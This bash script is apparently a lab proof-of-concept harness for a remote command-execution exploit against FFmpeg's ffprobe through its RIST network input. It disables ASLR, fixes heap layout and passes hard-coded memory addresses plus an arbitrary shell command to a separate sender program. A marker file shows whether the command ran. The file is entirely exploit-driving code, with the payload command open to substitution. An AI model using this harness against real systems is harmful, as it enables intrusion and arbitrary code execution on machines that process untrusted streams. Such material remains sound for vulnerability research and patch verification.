#!/usr/bin/env bash
# W4: end-to-end command execution with NO debugger attached. ASLR disabled
# with setarch -R so the lab-measured absolute addresses hold; brk layout via
# MALLOC_MMAP_THRESHOLD_. NAME BINARY MARKER CMD LEN SENDER
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
LIB="$ROOT/prefix/lib"
name=${1:-ng-vuln}; bin=${2:-$ROOT/plain/src/ffprobe_g}
marker=${3:-/tmp/ffmpeg2shell-w4-nogdb}
cmd=${4:-'touch /tmp/ffmpeg2shell-w4-nogdb'}
len=${5:-9968}
sender=${6:-rist_sender_cmd}
cb=${7:-0x7ffff7a58750}
prot=0x55555584f5a0; ring=0x5555558d1fe0; priv=0x5555560d2100
opaque=0x5555560d20d0
mkdir -p "$ROOT/evidence"
rm -f "$marker"
OUT="$ROOT/evidence/${name}-recv.log"; SEND="$ROOT/evidence/${name}-send.log"
(env setarch $(uname -m) -R env LD_LIBRARY_PATH="$LIB" \
    MALLOC_MMAP_THRESHOLD_=16777216 timeout 25 "$bin" -hide_banner \
    -loglevel verbose -f data -i async:rist://@:5004 -show_packets \
    > "$OUT" 2>&1; echo "ffprobe rc=$?" >> "$OUT") &
recv_pid=$!
sleep 3
if [ "$sender" = rist_sender_cmd ]; then
    (env LD_LIBRARY_PATH="$LIB" timeout 20 "$ROOT/$sender" \
        'rist://127.0.0.1:5004' 2200 "$len" "$prot" "$ring" "$priv" "$cb" "$opaque" "$cmd" \
        > "$SEND" 2>&1; echo "sender rc=$?" >> "$SEND") &
else
    (env LD_LIBRARY_PATH="$LIB" timeout 20 "$ROOT/$sender" \
        'rist://127.0.0.1:5004' 2200 "$len" > "$SEND" 2>&1; echo "sender rc=$?" >> "$SEND") &
fi
send_pid=$!
wait $send_pid $recv_pid
if [ -e "$marker" ]; then effect=CREATED; else effect=absent; fi
printf '%-12s marker=%s | %s | %s\n' "$name" "$effect" \
    "$(tail -1 "$OUT")" "$(tail -1 "$SEND")"
